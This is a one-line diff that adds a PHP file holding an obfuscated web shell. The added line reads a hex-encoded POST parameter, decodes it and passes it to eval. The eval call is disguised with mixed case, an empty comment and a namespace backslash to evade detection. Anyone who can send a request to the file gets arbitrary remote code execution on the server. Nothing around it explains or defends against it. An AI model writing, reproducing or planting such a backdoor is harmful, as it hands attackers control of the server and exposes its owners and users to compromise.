@@ -1,0 +1,1 @@
+<?=ok;$a = filter_input(INPUT_POST,'c');EvAl/**/(\hex2bin($a));
